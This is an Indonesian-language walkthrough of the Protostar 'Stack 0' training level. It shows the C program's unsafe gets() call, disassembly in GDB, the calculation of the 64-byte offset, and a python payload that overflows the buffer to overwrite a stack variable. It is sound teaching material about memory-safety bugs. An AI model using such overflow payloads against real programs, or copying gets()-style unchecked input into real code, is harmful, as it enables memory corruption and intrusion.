# Stack 0
## Tentang
Level ini memperkenalkan konsep bahwa memori dapat diakses di luar wilayah yang dialokasikan, bagaimana variabel stack ditata, dan bahwa memodifikasi di luar memori yang dialokasikan dapat mengubah eksekusi program.

## Source Code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

## Target Exploits
Pada level ini kita ditargetkan untuk mengubah variabel **modified** menjadi tidak sama dengan 0 untuk mencetak string "you have changed the 'modified' variable". Pada program diatas, input kita disimpan pada kedalam buffer menggunakan fungsi gets(). Karena gets() bukanlah fungsi yang aman, kita dapat menggunakannya untuk menimpa memori dimana variabel **modified** disimpan.

## Kerentanan Program
Seperti yang dikatakan sebelumnya **gets()** adalah fungsi yang tidak aman. Jika kita melihat pada man pages gets() dengan mengetikkan *man gets* pada bagian BUGS disebutkan bahwa gets() rentan karena tidak mungkin untuk mengetahui berapa banyak karakter yang akan diterima oleh gets(). fungsi ini akan terus menyimpan karakter setelah akhir buffer.

## Lets Dive Deeper
**[!] Disclaimer** saya disini memindahkannya dari Protostar machine kedalam local maschine saya, agar lebih mudah untuk menganalisis programnya. Disini saya juga menggunakan ekstensi dari GDB yaitu gef. Jadi alamat pada machine anda mungkin berbeda

Pertama tama kita coba liat bagaimana kodenya terlihat di assembly menggunakan command berikut
> **gdb -q stack0** </br>
> **disass main**
```
   0x080483f4 <+0>:	push   ebp
   0x080483f5 <+1>:	mov    ebp,esp
   0x080483f7 <+3>:	and    esp,0xfffffff0
   0x080483fa <+6>:	sub    esp,0x60
   0x080483fd <+9>:	mov    DWORD PTR [esp+0x5c],0x0
   0x08048405 <+17>:	lea    eax,[esp+0x1c]
   0x08048409 <+21>:	mov    DWORD PTR [esp],eax
   0x0804840c <+24>:	call   0x804830c <gets@plt>
   0x08048411 <+29>:	mov    eax,DWORD PTR [esp+0x5c]
   0x08048415 <+33>:	test   eax,eax
   0x08048417 <+35>:	je     0x8048427 <main+51>
   0x08048419 <+37>:	mov    DWORD PTR [esp],0x8048500
   0x08048420 <+44>:	call   0x804832c <puts@plt>
   0x08048425 <+49>:	jmp    0x8048433 <main+63>
   0x08048427 <+51>:	mov    DWORD PTR [esp],0x8048529
   0x0804842e <+58>:	call   0x804832c <puts@plt>
   0x08048433 <+63>:	leave
   0x08048434 <+64>:	ret

```

Kita dapat melihat pada alamat **0x08048415** terdapat fungsi yang membandingkan nilai dari eax dengan eax. Membingungkan bukan? </br>
Namun jika kita melihat sedikit keatas, kita dapat melihat pada alamat **0x08048411** bahwa nilai dari alamat **esp+0x5c** dimasukkan kedalam eax. Coba kita lihat di dalam gdb apa nilai dari alamat **esp+0x5c** tersebut dengan meletakkan breakpoint pada **0x08048415**

> b *0x08048415 </br>
> run </br>
> AAAA </br>
> x/wx $esp+0x5c

```
gef➤  x/wx $esp+0x5c
0xffffcdec:	0x00000000
```

Terlihat bahwa nilai dari alamat itu adalah 0. Kita diperintahkan untuk mengubah nilainya agar != 0 bukan? </br>
**Bagaimana Caranya??** </br>
Coba kita lihat kembali pada functions main, apa yang ia lakukan. Terdapat pada alamat **0x08048405** dimana nilai dari **esp+0x1c** dimasukkan kedalam eax juga. Apakah anda mengerti apa yang ia coba lakukan? :v. Coba kita lihat apa isi alamat itu

> gef➤  x/wx $esp+0x1c

```
gef➤  x/wx $esp+0x1c
0xffffcdac:	0x41414141
```

Jika kita melihat pada kedua alamat tersebut **0xffffcdec** dan **0xffffcdac**, bukankah mereka terlihat tidak begitu jauh?. Hanya dari *ec* ke *ac*. Mari coba kita hitung seberapa banyak karakter yang diperlukan untuk menimpa alamat variabel modified itu

> p/d 0xffffcdec - 0xffffcdac

```
gef➤  p/d 0xffffcdec - 0xffffcdac
$1 = 64
```

Terlihat bahwa untuk mencapai alamat **0xffffcdec** dibutuhkan 64 karakter

## Mari Kita Cobaa
Kita dapat menggunakan python untuk menghasilkan 64 karakter tersebut
```
python -c "print ('A'*64)" | ./stack0
Try again?
```

Mengapa tidak berhasil mencetak string **you have changed the 'modified' variable**?? </br>
Itu karena modified variabel belum terganti, masih = 0. Kita bisa mencoba menambahkan satu karakter untuk menimpa variabel itu

```
python -c "print ('A'*64+'B')" | ./stack0
you have changed the 'modified' variable

```

Nah.. Sekarang coba kita lihat apa yang terjadi di GDB

```
b *0x08048415 
run 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
x/wx $esp+0x5c
0xffffcdec:	0x00000042
x/wx $esp+0x1c
0xffffcdac:	0x41414141
```

Dapat dilihat sekarang alamat modified variabel kita sudah terganti dengan 0x00000042, 0x42 adalah "**B**" dalam Hexadesimal


